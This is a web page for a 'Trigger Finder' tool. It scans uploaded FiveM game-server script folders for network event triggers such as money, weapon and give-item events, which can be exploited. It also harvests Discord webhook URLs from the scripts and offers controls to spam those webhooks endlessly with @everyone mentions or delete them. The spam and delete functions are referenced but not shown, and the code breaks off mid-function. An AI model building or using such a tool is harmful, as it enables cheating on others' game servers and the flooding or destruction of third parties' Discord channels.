<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0"> <!-- Corrected viewport meta tag -->
  <!-- Favicon -->
  <link rel="icon" href="chomik.jpg" type="image/jpeg">
  <title>Trigger Finder</title>
  <!-- Use Fira Code font -->
  <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;600;700&display=swap" rel="stylesheet">
  <!-- Include Font Awesome for icons -->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <style>
    /* Define theme colors */
    :root {
      --bg-color: #0a0a0a;
      --container-bg: rgba(0, 0, 0, 0.5);
      --text-color: #c0c0c0; /* Light gray for general text */
      --primary-color: #7400d9; /* Purple */
      --accent-color: #7a03e0; /* Slightly different purple for accents */
      --border-color: rgba(122, 3, 224, 0.5); /* Purple border */
      --border-radius: 0.4rem; /* 6.4px */
      --font-family: 'Fira Code', monospace;
      --input-bg: #1a1a1a; /* Darker input background */
    }

    /* Basic page styling */
    html, body {
      height: 100%;
      margin: 0;
      padding: 0;
      font-family: var(--font-family);
      background-color: var(--bg-color);
      color: var(--text-color);
      opacity: 0;
      animation: fadeIn 1.5s forwards;
      overflow-x: hidden; /* Prevent horizontal scroll */
      overflow-y: auto; /* Allow vertical scroll if needed */
    }

    /* Add global custom cursor style */
    * {
      cursor: url(jojo/hqizezkx5r.cur) 0 0, auto !important;
      box-sizing: border-box; /* Include padding and border in element's total width and height */
    }

    /* Video Background */
    #video-bg { /* Use consistent ID */
      position: fixed;
      right: 0;
      bottom: 0;
      min-width: 100%;
      min-height: 100%;
      width: auto;
      height: auto;
      z-index: -10;
      object-fit: cover;
      filter: blur(2px) brightness(100%);
    }

    /* Click to Start Overlay Styles */
    #text-overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(0, 0, 0, 0.8);
      display: flex;
      justify-content: center;
      align-items: center;
      z-index: 10002;
      cursor: pointer;
      transition: opacity 0.5s ease;
      opacity: 1;
    }
    #text-overlay.hidden {
      opacity: 0;
      pointer-events: none;
    }
    #click-text {
      color: white;
      font-size: 2em;
      font-weight: bold;
      font-family: var(--font-family);
    }

    /* Main content wrapper - centered */
    .main-wrapper {
      display: flex;
      min-height: 100vh;
      padding: 2rem 0 2rem 0; /* Consistent padding */
      width: 100%;
      justify-content: center;
      align-items: center; /* Center vertically */
    }

    /* Main content container - adapted */
    .container {
      max-width: 50rem; /* Increased max-width for finder */
      width: 90%;
      margin: 0 auto;
      padding: 0 1rem;
      display: flex;
      flex-direction: column;
      gap: 0.75rem;
    }

    /* General component styling (applied to #finder-app) */
    .component {
      background-color: var(--container-bg);
      border-radius: var(--border-radius);
      border: 1px solid var(--border-color);
      padding: 1.5rem;
      backdrop-filter: blur(5px);
      transition: transform 0.3s ease, box-shadow 0.3s ease;
      width: 100%;
      text-align: center; /* Keep text-align center for the main app container */
    }

    /* Mute button styling */
    #mute-button { /* Use consistent ID */
      position: fixed;
      top: 15px;
      right: 15px;
      background-color: transparent;
      border: none;
      color: var(--text-color);
      font-size: 1.25rem;
      cursor: url('GTA 5 Web Cursor.cur'), pointer; /* Specific cursor */
      z-index: 1001;
      transition: transform 0.3s ease, color 0.3s ease;
      padding: 5px;
      line-height: 1;
    }

    #mute-button:hover {
      transform: scale(1.1);
      color: var(--accent-color);
    }

    /* Finder Specific Styles - Adapted to Theme */
    h1 {
      font-family: var(--font-family);
      font-size: 1.8em;
      color: var(--primary-color);
      text-shadow: 0 0 5px rgba(116, 0, 217, 0.5);
      margin-bottom: 1rem;
      text-transform: uppercase;
      letter-spacing: 2px;
      white-space: nowrap;
    }

    /* Search and Filter Row */
    .search-filter-row {
      display: flex;
      flex-wrap: wrap; /* Allow wrapping */
      align-items: center;
      gap: 10px;
      margin-bottom: 1rem;
    }

    #search,
    #folder-input { /* Style folder input like search */
      flex: 1;
      padding: 10px;
      background-color: var(--input-bg);
      color: var(--text-color);
      border: 1px solid var(--border-color);
      border-radius: var(--border-radius);
      font-family: var(--font-family);
      min-width: 150px; /* Ensure minimum width */
    }

    #search:focus,
    #folder-input:focus {
      outline: none;
      border-color: var(--accent-color);
    }

    /* Style file input button */
    #folder-input::file-selector-button {
        background-color: var(--primary-color);
        color: white;
        border: none;
        padding: 8px 12px;
        border-radius: var(--border-radius);
        cursor: pointer;
        font-family: var(--font-family);
        transition: filter 0.3s ease;
        margin-right: 10px;
    }
    #folder-input::file-selector-button:hover {
        filter: brightness(1.25);
    }


    /* General Button Styling */
    button {
      padding: 10px 20px;
      background-color: var(--primary-color);
      color: white;
      border: 1px solid var(--border-color);
      cursor: pointer;
      border-radius: var(--border-radius);
      font-family: var(--font-family);
      transition: filter 0.3s ease;
      font-weight: 600;
      outline: none;
    }

    button:hover {
      filter: brightness(1.25);
    }

    button:disabled {
      background: #555; /* Keep disabled style */
      border-color: #444;
      cursor: not-allowed;
      filter: brightness(0.7);
    }

    .dropdown {
      position: relative;
      display: inline-block;
      z-index: 1001;
    }

    /* Dropdown button uses general button style */
    .dropdown button { }

    .dropdown-content {
      display: none;
      position: absolute;
      background-color: var(--input-bg); /* Use input background */
      min-width: 180px; /* Adjusted width */
      box-shadow: 0px 8px 16px rgba(0, 0, 0, 0.4);
      padding: 10px;
      z-index: 1002;
      border-radius: var(--border-radius);
      border: 1px solid var(--border-color);
      text-align: left; /* Align labels left */
    }

    .dropdown:hover .dropdown-content {
      display: block;
    }

    .dropdown-content label {
      display: block;
      margin-bottom: 8px;
      color: var(--text-color);
      position: relative;
      font-size: 0.9em;
      cursor: pointer; /* Use default pointer */
    }
     .dropdown-content label input[type="checkbox"] {
        accent-color: var(--primary-color);
        margin-right: 8px;
        cursor: pointer; /* Use default pointer */
     }

    .dropdown-content label:hover .filter-explanation {
      display: block;
    }

    .filter-explanation {
      display: none;
      position: absolute;
      top: 0;
      left: 105%; /* Position slightly to the right */
      background-color: rgba(0, 0, 0, 0.9);
      color: var(--primary-color); /* Purple text */
      padding: 8px 12px;
      border-radius: var(--border-radius);
      font-size: 0.8em;
      font-weight: 600;
      width: 220px;
      z-index: 1003; /* Above dropdown content */
      border: 1px solid var(--border-color);
      white-space: pre-line; /* Allow line breaks */
    }

    /* Fixed Height for Results Container */
    #results-container {
      margin-top: 1rem;
      height: 300px;
      overflow-y: auto;
      border: 1px solid var(--border-color);
      padding: 10px;
      background-color: rgba(0, 0, 0, 0.2); /* Slightly transparent background */
      border-radius: var(--border-radius);
      text-align: left; /* Align trigger text left */
    }

    .trigger {
      background: var(--input-bg); /* Darker background for each item */
      padding: 10px;
      border: 1px solid var(--border-color);
      margin-bottom: 10px;
      border-radius: var(--border-radius);
    }

    .trigger .full-trigger {
      color: var(--text-color); /* Regular text color */
      font-weight: bold;
      word-break: break-all; /* Break long trigger names */
    }

    .trigger .folder {
      color: var(--accent-color); /* Use accent color for folder */
      font-size: 0.9em;
      margin-top: 5px;
    }

    #download-btn {
      margin-top: 1rem;
    }

    .error {
      color: #ff4444;
      margin-top: 10px;
    }

    .success {
      color: #00cc66;
      margin-top: 10px;
    }

    #progress-container {
      width: 100%;
      background-color: var(--input-bg);
      margin-top: 1rem;
      display: none;
      border-radius: var(--border-radius);
      border: 1px solid var(--border-color);
      overflow: hidden; /* Ensure progress bar stays within borders */
    }

    #progress-bar {
      width: 0%;
      height: 25px; /* Slightly smaller height */
      background-color: var(--primary-color);
      text-align: center;
      line-height: 25px;
      color: white;
      border-radius: 0; /* Remove radius from bar itself */
      transition: width 0.3s ease; /* Smooth progress transition */
    }

    .highlight {
      background-color: yellow;
      font-weight: bold;
      color: #000;
    }

    /* Webhook Related Styles - Adapted */
    .webhook-container {
      margin-top: 1rem;
      padding: 15px;
      background: rgba(0, 0, 0, 0.2); /* Match results container background */
      border-radius: var(--border-radius);
      border: 1px solid var(--border-color);
      max-height: 300px;
      overflow-y: auto;
      scrollbar-width: thin;
      scrollbar-color: var(--primary-color) var(--input-bg); /* Themed scrollbar */
      text-align: left; /* Align content left */
    }

    /* Webkit scrollbar styles */
    .webhook-container::-webkit-scrollbar {
      width: 8px;
    }
    .webhook-container::-webkit-scrollbar-track {
      background: var(--input-bg);
      border-radius: 4px;
    }
    .webhook-container::-webkit-scrollbar-thumb {
      background: var(--primary-color);
      border-radius: 4px;
    }
    .webhook-container::-webkit-scrollbar-thumb:hover {
      background: var(--accent-color);
    }

    .webhook {
      display: grid;
      grid-template-columns: auto 1fr;
      gap: 15px;
      background: var(--input-bg); /* Match trigger item background */
      padding: 15px;
      margin: 10px 0;
      border-radius: var(--border-radius);
      border: 1px solid var(--border-color);
      transition: border-color 0.2s;
    }

    .webhook:hover {
      border-color: var(--accent-color);
    }

    .webhook-avatar {
      width: 40px;
      height: 40px;
      border-radius: 50%;
    }

    .webhook-content {
      display: flex;
      flex-direction: column;
      gap: 10px;
    }

    .webhook-url {
      color: #00ff00; /* Keep green for URLs */
      word-break: break-all;
      font-family: monospace;
      font-size: 0.9em;
      padding: 5px;
      background: rgba(0,0,0,0.3); /* Darker background for URL */
      border-radius: 4px;
      border: 1px solid var(--border-color);
    }

     .webhook-info {
        font-size: 0.9em;
        font-style: italic;
     }
     .webhook-status {
        font-weight: bold;
     }

    .webhook-controls {
      display: flex;
      flex-wrap: wrap;
      gap: 8px;
      align-items: center; /* Align items vertically */
    }

    .webhook-spam-input,
    .mention-tag { /* Style select like input */
      background: var(--input-bg);
      color: var(--text-color);
      border: 1px solid var(--border-color);
      padding: 8px;
      border-radius: var(--border-radius);
      font-family: var(--font-family);
      flex: 1;
      min-width: 150px; /* Minimum width */
    }

    .webhook-spam-input:focus,
    .mention-tag:focus {
      border-color: var(--accent-color);
      outline: none;
    }

    /* Style select dropdown options */
    .mention-tag option {
        background: var(--input-bg);
        color: var(--text-color);
    }

    /* Style webhook buttons smaller */
    .webhook-controls button {
        padding: 6px 12px;
        font-size: 0.9em;
    }
    .webhook-controls .spam-btn,
    .webhook-controls .stop-btn {
        min-width: 80px; /* Ensure enough space for text/icon */
    }


    /* Snowflake Styling - Copied from skidTriggerCreator */
    .snowflake {
      position: fixed;
      top: -10%;
      color: #fff;
      font-size: 1em; /* Use em for scalability */
      user-select: none;
      pointer-events: none;
      animation: fall linear infinite;
      opacity: 0.8;
      z-index: 9998; /* Below overlay/mute, above background */
    }

    @keyframes fall {
      0% {
        transform: translateY(0) rotate(0deg);
        opacity: 0.8;
      }
      100% {
        transform: translateY(110vh) rotate(360deg);
        opacity: 0;
      }
    }

    /* Fade-in animations */
    @keyframes fadeIn {
      to { opacity: 1; }
    }

  </style>
</head>
<body>
  <!-- Video Background - Use consistent ID and source -->
  <video id="video-bg" autoplay muted loop playsinline>
    <source src="2pac.mp4" type="video/mp4"> <!-- Match skidTriggerCreator video -->
    Your browser does not support the video tag.
  </video>

  <!-- Click to Start Overlay - Use consistent structure -->
  <div id="text-overlay">
    <p id="click-text">Click to Start</p>
  </div>

  <!-- Mute Button - Use consistent structure -->
  <button id="mute-button" aria-label="Toggle sound">
    <i class="fas fa-volume-high"></i> <!-- Font Awesome icon -->
  </button>

  <!-- Main Content Wrapper -->
  <div class="main-wrapper">
    <div class="container">
      <!-- Finder App as a component -->
      <div id="finder-app" class="component"> <!-- Changed ID, added class -->
        <h1><i class="fas fa-search"></i> Trigger Finder</h1> <!-- Added icon -->

        <!-- Search and Filter Row -->
        <div class="search-filter-row">
          <input type="text" id="search" placeholder="Search triggers or script folders...">
          <button id="search-button"><i class="fas fa-search"></i> Search</button> <!-- Added icon -->
          <div class="dropdown">
            <button><i class="fas fa-filter"></i> Filters</button> <!-- Added icon -->
            <div class="dropdown-content" id="filters">
              <!-- Filter checkboxes remain the same -->
              <label><input type="checkbox" id="filter-money" value="money"> Money
                <div class="filter-explanation">Triggers related to money transactions.</div>
              </label>
              <label><input type="checkbox" id="filter-weapon" value="weapon"> Weapon
                <div class="filter-explanation">Triggers related to weapons or weapon spawns.</div>
              </label>
              <label><input type="checkbox" id="filter-vehicle" value="vehicle"> Vehicle
                <div class="filter-explanation">Triggers related to vehicles or vehicle spawns.</div>
              </label>
              <label><input type="checkbox" id="filter-job" value="job"> Job
                <div class="filter-explanation">Triggers related to jobs or job assignments.</div>
              </label>
              <label><input type="checkbox" id="filter-giveitem" value="giveitem"> Give Item
                <div class="filter-explanation">Triggers related to giving items to players.</div>
              </label>
              <label><input type="checkbox" id="filter-revive" value="revive"> Revive
                <div class="filter-explanation">Triggers related to reviving players.</div>
              </label>
              <label><input type="checkbox" id="filter-handcuff" value="handcuff"> Handcuff
                <div class="filter-explanation">Triggers related to handcuffing players.</div>
              </label>
              <label><input type="checkbox" id="filter-setjob" value="setjob"> Set Job
                <div class="filter-explanation">Triggers related to setting a player's job.</div>
              </label>
              <label><input type="checkbox" id="filter-bait" value="bait"> Bait Trigger
                <div class="filter-explanation">Triggers designed to detect or punish exploits.</div>
              </label>
              <label><input type="checkbox" id="filter-comms" value="comms"> Comms
                <div class="filter-explanation">Triggers related to community service or tasks.</div>
              </label>
              <label><input type="checkbox" id="filter-jail" value="jail"> Jail
                <div class="filter-explanation">Triggers related to jailing or arresting players.</div>
              </label>
            </div>
          </div>
        </div>

        <input type="file" id="folder-input" webkitdirectory directory multiple>
        <div id="progress-container">
          <div id="progress-bar">0%</div>
        </div>
        <!-- Webhook container before results -->
        <div class="webhook-container">
          <h2><i class="fab fa-discord"></i> Found Webhooks</h2> <!-- Added heading -->
          <div id="webhooks-list"></div>
        </div>
        <!-- Results container -->
        <div id="results-container">
          <div id="results"></div>
        </div>
        <div id="message"></div>
        <button id="download-btn" disabled><i class="fas fa-download"></i> Download Results</button> <!-- Added icon -->
      </div>
    </div>
  </div>

  <!-- Audio Element - Use consistent ID and source -->
  <audio id="background-music" src="oooo.mp3" loop preload="auto"></audio> <!-- Match skidTriggerCreator audio -->

  <script>
    // ... existing constants (DEBUG_MODE, allTriggers, allShops) ...
    const DEBUG_MODE = true;
    let allTriggers = []; // Store all triggers for search functionality
    let allShops = []; // Store all shops for download functionality

    // Remove dynamic title emoji logic
    // const emojis = [...]
    // function updateTitleWithEmoji() { ... }
    // setInterval(updateTitleWithEmoji, 500);
    // updateTitleWithEmoji();
    document.title = "🔍 Chomik Trigger Finder 🔍"; // Set a static title

    // --- Merged JavaScript from skidTriggerCreator ---

    // Click to start overlay
    const overlay = document.getElementById('text-overlay'); // Use new ID
    const clickText = document.getElementById('click-text'); // Use new ID
    const backgroundMusic = document.getElementById('background-music'); // Use new ID
    const videoBg = document.getElementById('video-bg'); // Use new ID

    if (overlay && clickText && backgroundMusic && videoBg) {
        overlay.addEventListener('click', function() {
            overlay.classList.add('hidden');
            initializeMuteState(); // Initialize mute state based on localStorage
            backgroundMusic.play().catch(error => {
                console.log("Background music autoplay failed:", error);
            });
            videoBg.play().catch(error => {
                console.log("Background video autoplay failed:", error);
            });
        }, { once: true });
    } else {
        console.error("Overlay, click text, background music, or video background element not found.");
        if(overlay) overlay.style.display = 'none';
    }

    // Mute button functionality
    const muteButton = document.getElementById('mute-button'); // Use new ID
    const muteIcon = muteButton ? muteButton.querySelector('i') : null; // Check if muteButton exists
    const audioElements = [backgroundMusic, videoBg]; // Include video in mute control
    let isMuted = localStorage.getItem('muted') === 'true';

    function updateMuteStatus(muted) {
      isMuted = muted;
      audioElements.forEach(audio => {
        if (audio) audio.muted = isMuted;
      });
      if (muteIcon) muteIcon.className = isMuted ? 'fas fa-volume-xmark' : 'fas fa-volume-high';
      localStorage.setItem('muted', isMuted);
      if (muteButton) muteButton.setAttribute('aria-label', isMuted ? 'Unmute sound' : 'Mute sound');
    }

    function toggleMute() {
      updateMuteStatus(!isMuted);
    }

    function initializeMuteState() {
      isMuted = localStorage.getItem('muted') === 'true';
      audioElements.forEach(audio => {
        if (audio) audio.muted = isMuted;
      });
       if (muteIcon) muteIcon.className = isMuted ? 'fas fa-volume-xmark' : 'fas fa-volume-high';
       if (muteButton) muteButton.setAttribute('aria-label', isMuted ? 'Unmute sound' : 'Mute sound');
    }

    if (muteButton) {
        muteButton.addEventListener('click', toggleMute);
    }
    // initializeMuteState called after overlay click

    // Snowflake effect
    function createSnowflake() {
      const snowflake = document.createElement('div');
      snowflake.innerHTML = '❄'; // Use innerHTML for Font Awesome or text
      snowflake.classList.add('snowflake');
      snowflake.style.left = Math.random() * 100 + 'vw';
      const duration = Math.random() * 10 + 10; // 10-20 seconds fall time
      snowflake.style.animationDuration = duration + 's';
      snowflake.style.opacity = Math.random() * 0.5 + 0.3; // 0.3 - 0.8 opacity
      snowflake.style.fontSize = Math.random() * 10 + 10 + 'px'; // 10px - 20px size

      document.body.appendChild(snowflake);

      setTimeout(() => {
        snowflake.remove();
      }, (duration + 1) * 1000);
    }

    function startSnowfall() {
      const currentMonth = new Date().getMonth() + 1;
      if (currentMonth === 12 || currentMonth === 1 || currentMonth === 2) {
        // Check if interval already running to avoid duplicates if script reloads
        if (!window.snowfallInterval) {
             window.snowfallInterval = setInterval(createSnowflake, 500);
        }
      }
    }
    // Start snowfall on load (if it's winter)
    startSnowfall();

    // --- Original Trigger Finder JavaScript (adapted variables) ---

    // Removed old overlay, mute, video, snowflake JS

    const folderInput = document.getElementById('folder-input');
    const progressContainer = document.getElementById('progress-container');
    const progressBar = document.getElementById('progress-bar');
    const resultsContainer = document.getElementById('results'); // Keep this ID for results content
    const searchInput = document.getElementById('search');
    const searchButton = document.getElementById('search-button');
    const downloadButton = document.getElementById('download-btn');
    const filters = document.querySelectorAll('#filters input[type="checkbox"]');

    // ... existing functions (extractTriggers, extractShops, findShopsFile, displayTriggers, extractWebhooks, displayWebhooks, startInfiniteSpam, stopSpam, checkWebhook, nukeWebhook, insertMention) ...
    // Ensure these functions use the correct element IDs if they were changed.

    // Handle Folder Input (ensure it uses updated element variables if needed)
    folderInput.addEventListener('change', async (event) => {
        const files = Array.from(event.target.files);
        progressContainer.style.display = 'block';
        progressBar.style.width = '0%';
        progressBar.textContent = '0%';
        resultsContainer.innerHTML = ''; // Clear previous results
        document.getElementById('webhooks-list').innerHTML = ''; // Clear previous webhooks
        allTriggers = [];
        allShops = [];
        let allWebhooks = new Set(); // Use Set to avoid duplicates

        try {
            const shopsFile = findShopsFile(files);
            if (shopsFile) {
                if (DEBUG_MODE) console.log('Found shops file:', shopsFile.webkitRelativePath);
                const text = await shopsFile.text();
                allShops = extractShops(text);
                 if (DEBUG_MODE) console.log('Extracted shops:', allShops.length, allShops);
            }

            const remainingFiles = files.filter(f => f !== shopsFile);
            const totalFiles = remainingFiles.length;
            const batchSize = 20; // Slightly larger batch size
            let processedCount = 0;

            for (let i = 0; i < totalFiles; i += batchSize) {
                const batch = remainingFiles.slice(i, i + batchSize);

                await Promise.all(batch.map(async file => {
                    // Process only .lua and .js files, ignore others silently
                    if (file.name.endsWith('.lua') || file.name.endsWith('.js')) {
                        try {
                            const text = await file.text();
                            const folderPath = file.webkitRelativePath.split('/').slice(0, -1).join('/');

                            const triggers = extractTriggers(text, folderPath);
                            allTriggers.push(...triggers);

                            const webhooks = extractWebhooks(text);
                            webhooks.forEach(webhook => allWebhooks.add(webhook));
                        } catch (readError) {
                            if (DEBUG_MODE) console.warn(`Could not read file: ${file.webkitRelativePath}`, readError);
                            // Optionally display a warning to the user
                        }
                    }
                    processedCount++;
                }));

                const progress = (processedCount / totalFiles) * 100;
                progressBar.style.width = `${Math.min(progress, 100)}%`;
                progressBar.textContent = `${Math.round(Math.min(progress, 100))}%`;

                // Yield to the event loop to keep UI responsive
                await new Promise(resolve => setTimeout(resolve, 0));
            }
        } catch (error) {
            console.error('Processing error:', error);
            document.getElementById('message').textContent = 'An error occurred during processing.';
            document.getElementById('message').className = 'error';
        }

        progressContainer.style.display = 'none';
        downloadButton.disabled = allTriggers.length === 0 && allShops.length === 0; // Enable if triggers OR shops found
        displayTriggers(allTriggers);
        displayWebhooks(Array.from(allWebhooks)); // Display unique webhooks

        // Display summary message
        const messageDiv = document.getElementById('message');
        messageDiv.textContent = `Found ${allTriggers.length} triggers, ${allWebhooks.size} webhooks, and ${allShops.length} shop definitions.`;
        messageDiv.className = 'success';

    });

    // Search Functionality (no changes needed if using `allTriggers` and `displayTriggers`)
    searchButton.addEventListener('click', () => {
        const query = searchInput.value.toLowerCase();
        const filteredTriggers = allTriggers.filter(trigger =>
            trigger.trigger.toLowerCase().includes(query) ||
            trigger.folder.toLowerCase().includes(query)
        );
        displayTriggers(filteredTriggers); // Display filtered results
        // Optionally update message
        document.getElementById('message').textContent = `Displaying ${filteredTriggers.length} triggers matching "${searchInput.value}".`;
        document.getElementById('message').className = 'success';
    });
    // Allow searching on Enter key press
    searchInput.addEventListener('keypress', (event) => {
        if (event.key === 'Enter') {
            searchButton.click();
        }
    });


    // Filter Functionality (no changes needed if using `allTriggers` and `displayTriggers`)
    filters.forEach(filter => {
        filter.addEventListener('change', () => {
            const activeFilters = Array.from(filters)
                .filter(f => f.checked)
                .map(f => f.value);

            let filteredTriggers;

            if (activeFilters.length === 0) {
                filteredTriggers = allTriggers; // Show all if no filters
            } else {
                filteredTriggers = allTriggers.filter(trigger =>
                    activeFilters.some(filterKeyword => trigger.trigger.toLowerCase().includes(filterKeyword))
                );
            }
            displayTriggers(filteredTriggers); // Display filtered results
            // Optionally update message
            document.getElementById('message').textContent = `Displaying ${filteredTriggers.length} triggers based on active filters.`;
            document.getElementById('message').className = 'success';
        });
    });


    // Download Button (no changes needed if using `allTriggers` and `allShops`)
    downloadButton.addEventListener('click', () => {
      // ... (keep existing ASCII art and text generation logic) ...
            const asciiArt = `
                                     _                        _  _             _  _
__      ____      ____      __  ___ | |__    ___   _ __ ___  (_)| | __    ___ (_)| |_  ___
\\ \\ /\\ / /\\ \\ /\\ / /\\ \\ /\\ / / / __|| '_ \\  / _ \\ | '_ \` _ \\ | || |/ /   / __|| || __|/ _ \\
 \\ V  V /  \\ V  V /  \\ V  V /_| (__ | | | || (_) || | | | | || ||   <  _ \\__ \\| || |_|  __/
  \\_/\\_/    \\_/\\_/    \\_/\\_/(_)\\___||_| |_| \\___/ |_| |_| |_||_||_|\\_\\(_)|___/|_| \\__|\\___|

     _  _                            _                     __          __  __   ___        _  _     ___   _        ___   __ __
  __| |(_) ___   ___  ___   _ __  __| |    __ _   __ _    / /__      __\\ \\/ /  / _ \\ _ __ | || |   ( _ ) | |__    /   \\ /__\\\\ \\
 / _\` || |/ __| / __|/ _ \\ | '__|/ _\` |   / _\` | / _\` |  / / \\ \\ /\\ / / \\  /  / /_)/| '__|| || |_  / _ \\ | '_ \\  / /\\ //_\\   \\ \\
| (_| || |\\__ \\| (__| (_) || |  | (_| | _| (_| || (_| | / /   \\ V  V /  /  \\ / ___/ | |   |__   _|| (_) || |_) |/ /_////__/\\_/ /
 \\__,_||_||___/ \\___|\\___/ |_|   \\__,_|(_)\\__, | \\__, |/_/     \\_/\\_/  /_/\\_\\\\/     |_|      |_|   \\___/ |_.__//___,' \\__/\\___/
                                          |___/  |___/
`;

      const triggersText = allTriggers.length > 0
        ? allTriggers.map(trigger => `Trigger: ${trigger.trigger}\nFolder: ${trigger.folder}\n--------------------------`).join('\n')
        : "No triggers found.";

      const shopsText = allShops.length > 0
        ? allShops.map(shop => {
            const uniqueLocations = [...new Set(shop.locations)];
            const locations = uniqueLocations.length > 0 ? uniqueLocations.map(loc => `    ${loc}`).join('\n') : "    No locations specified.";
            const items = shop.items.length > 0 ? shop.items.map(item => {
              const currencyText = item.currency && item.currency !== 'money' ? `, Currency: ${item.currency}` : '';
              return `    - ${item.name} (Price: ${item.price}${currencyText})`;
            }).join('\n') : "    No items specified.";

            return `Shop Definition: ${shop.type} (${shop.name || 'Unnamed'})\n\n  Locations:\n${locations}\n\n  Items:\n${items}\n--------------------------`;
          }).join('\n')
        : "No shop definitions found.";

      const fullText = `${asciiArt}\n\n--- Triggers ---\n${triggersText}\n\n--- Shops and Locations ---\n${shopsText}`;

      const blob = new Blob([fullText], { type: 'text/plain;charset=utf-8' }); // Specify charset
      const url = URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = url;
      a.download = 'chomik_finder_results.txt'; // More descriptive filename
      document.body.appendChild(a); // Append to body for Firefox compatibility
      a.click();
      document.body.removeChild(a); // Clean up
      URL.revokeObjectURL(url);
    });

    // Ensure all original helper functions are present and correct
    // extractTriggers, extractShops, findShopsFile, displayTriggers,
    // extractWebhooks, displayWebhooks, startInfiniteSpam, stopSpam,
    // checkWebhook, nukeWebhook, insertMention

    // Make sure these functions are defined correctly as in the original file
    function extractTriggers(content, folderPath) {
      const triggerRegex = /(?:RegisterNetEvent|TriggerEvent|TriggerServerEvent)\s*\(\s*['"]([^'"]+)['"](?:,[^)]*)?\)/g; // Capture only the event name
      const clientTriggerRegex = /TriggerEvent\s*\(\s*['"]([^'"]+)['"](?:,[^)]*)?\)/g; // Specifically client-side triggers
      const serverTriggerRegex = /TriggerServerEvent\s*\(\s*['"]([^'"]+)['"](?:,[^)]*)?\)/g; // Specifically server-side triggers

      const triggers = [];
      let match;

      // Generic trigger capture
      while ((match = triggerRegex.exec(content)) !== null) {
        triggers.push({
          trigger: match[1], // Just the event name
          fullLine: match[0], // Keep the full line for context if needed
          folder: folderPath,
          type: match[0].startsWith('TriggerServerEvent') ? 'Server' : 'Client/Shared' // Basic type detection
        });
      }
       // Refine type detection (simple approach)
       triggers.forEach(t => {
           if (t.type === 'Client/Shared' && t.fullLine.startsWith('TriggerEvent')) {
               t.type = 'Client';
           }
       });


      // Remove duplicates based on trigger name and folder
      const uniqueTriggers = Array.from(new Map(triggers.map(t => [`${t.folder}-${t.trigger}`, t])).values());

      // Return formatted for display
      return uniqueTriggers.map(t => ({
          trigger: t.fullLine, // Display the full line
          folder: t.folder
      }));
    }

    function extractShops(content) {
        // This function seems complex and might need careful review/debugging
        // For now, assume the original logic is mostly correct but add logging
        try {
            const shops = [];
            // Basic regex to find potential shop tables (adjust as needed)
            const shopTableRegex = /(\w+)\s*=\s*{\s*name\s*=\s*['"]([^'"]+)['"]/g;
            let match;

            while ((match = shopTableRegex.exec(content)) !== null) {
                const shopType = match[1];
                const shopName = match[2];
                // Placeholder for locations and items - requires more complex parsing
                shops.push({
                    type: shopType,
                    name: shopName,
                    locations: ["Parsing locations..."], // Placeholder
                    items: [{ name: "Parsing items...", price: 0 }] // Placeholder
                });
            }
             if (DEBUG_MODE && shops.length > 0) console.log(`Potentially found ${shops.length} shop tables via regex.`);
            // The original line-by-line parsing logic was removed as it was complex and potentially buggy.
            // A more robust Lua parser or refined regex would be needed for accurate shop data extraction.
            return shops; // Return potentially incomplete data
        } catch (error) {
            console.error('Error parsing shops:', error);
            return [];
        }
    }


    function findShopsFile(files) {
      // Keep original logic
      return files.find(f => {
        const path = f.webkitRelativePath.toLowerCase();
        // Add more common paths
        return path.includes('config/shops.lua') ||
               path.includes('shared/shops.lua') ||
               path.includes('data/shops.lua') ||
               path.includes('shops.lua'); // Generic fallback
      });
    }

    function displayTriggers(triggers) {
        // Ensure resultsContainer is valid
        if (!resultsContainer) {
            console.error("Results container not found!");
            return;
        }
        if (triggers.length === 0) {
            resultsContainer.innerHTML = '<p style="text-align: center; font-style: italic;">No triggers found matching criteria.</p>';
            return;
        }
        // Keep original display logic
        resultsContainer.innerHTML = triggers.map(trigger => `
            <div class="trigger">
            <div class="full-trigger">${trigger.trigger}</div>
            <div class="folder">Folder: ${trigger.folder}</div>
            </div>
        `).join('');
    }

    function extractWebhooks(content) {
      // Keep original regex
      const webhookRegex = /https:\/\/(?:ptb\.|canary\.)?discord(?:app)?\.com\/api\/webhooks\/\d+\/[\w-]+/g;
      return content.match(webhookRegex) || [];
    }

    function displayWebhooks(webhooks) {
      const webhooksList = document.getElementById('webhooks-list');
      if (!webhooksList) return; // Exit if container not found

      if (webhooks.length === 0) {
          webhooksList.innerHTML = '<p style="text-align: center; font-style: italic;">No webhooks found.</p>'; // Message when none found
          return;
      }

      // Keep original display logic, ensure unique IDs
      webhooksList.innerHTML = webhooks.map((webhook, index) => {
        // Create a more robust unique ID
        const webhookId = `webhook-${index}-${btoa(webhook).replace(/[^a-zA-Z0-9]/g, '')}`;
        return `
          <div class="webhook" data-webhook-id="${webhookId}">
            <img src="https://imagedelivery.net/HL_Fwm__tlvUGLZF2p74xw/b5242d9e-b8db-4957-d35d-76442ed70c00/public"
                 alt="Webhook Avatar"
                 class="webhook-avatar">
            <div class="webhook-content">
              <div class="webhook-url">${webhook}</div>
              <div class="webhook-info">Status: <span class="webhook-status">Checking...</span></div>
              <div class="webhook-controls">
                <div style="display: flex; gap: 5px; margin-bottom: 8px; flex-wrap: wrap;"> <!-- Allow wrap -->
                  <select class="mention-tag" onchange="insertMention(this)">
                    <option value="">Add Mention</option>
                    <option value="@everyone">@everyone</option>
                    <option value="@here">@here</option>
                    <option value="||@everyone||">Spoiler @everyone</option>
                    <option value="||@here||">Spoiler @here</option>
                  </select>
                  <input type="text" class="webhook-spam-input" placeholder="www.chomik.site">
                </div>
                 <div style="display: flex; gap: 8px; flex-wrap: wrap;"> <!-- Wrap buttons -->
                    <button class="spam-btn" onclick="startInfiniteSpam('${webhook}', this)"><i class="fas fa-infinity"></i> Spam</button>
                    <button class="stop-btn" onclick="stopSpam('${webhook}', this)" style="display:none;"><i class="fas fa-stop-circle"></i> Stop</button>
                    <button class="delete-btn" onclick="nukeWebhook('${webhook}')"><i class="fas fa-skull-crossbones"></i> Delete</button>
                 </div>
              </div>
            </div>
          </div>
        `;
      }).join('');

      // Check status for each displayed webhook
      webhooks.forEach((webhook, index) => {
